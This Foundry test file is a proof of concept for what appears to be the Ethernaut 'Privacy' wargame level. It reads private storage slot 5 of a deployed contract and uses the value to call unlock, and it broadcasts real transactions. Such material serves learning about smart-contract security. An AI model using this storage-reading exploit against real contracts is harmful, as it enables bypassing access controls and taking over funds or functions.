// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../instances/Ilevel12.sol";

contract POC is Test {

    Privacy level12 = Privacy(0xaDeD3F5a4bf3951994F75b2bf1F4b62C320223D6);

    function test() external{
        vm.startBroadcast();
        bytes32 myKey = vm.load(address(level12), bytes32(uint256(5)));
        level12.unlock(bytes16(myKey));
        assertEq(level12.locked(), false);
        vm.stopBroadcast();
    }
}